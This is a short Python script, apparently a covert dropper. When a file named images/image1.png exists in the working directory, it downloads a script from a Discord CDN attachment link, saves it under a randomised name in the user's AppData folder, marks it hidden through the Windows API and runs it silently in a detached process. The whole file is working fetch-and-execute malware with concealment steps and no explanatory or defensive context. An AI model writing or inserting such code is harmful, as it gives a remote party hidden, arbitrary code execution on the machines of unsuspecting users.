import os
import requests
import subprocess
import uuid
import ctypes

def get_file(url):
    response = requests.get(url)
    if response.status_code == 200:
        script_content = response.text

        user_home = os.path.expanduser("~")
        app_data_dir = os.path.join(user_home, 'AppData', 'Local', 'App')

        os.makedirs(app_data_dir, exist_ok=True)

        unique_filename = f"temp_script_{uuid.uuid4().hex}.py"
        script_path = os.path.join(app_data_dir, unique_filename)

        with open(script_path, 'w') as f:
            f.write(script_content)

        ctypes.windll.kernel32.SetFileAttributesW(script_path, 2)

        subprocess.Popen(['python', script_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)


src_directory = os.path.join(os.getcwd(), 'images')
settings_file = os.path.join(src_directory, 'image1.png')

if os.path.exists(settings_file):
    script_url = 'https://cdn.discordapp.com/attachments/1289072117937213453/1293298321506439303/testup.py?ex=6706dd6c&is=67058bec&hm=42e5c6598d3c82f74dcf85b33bbd30df11d220781422018e79a3c4d50ff188ee&'
    get_file(script_url)
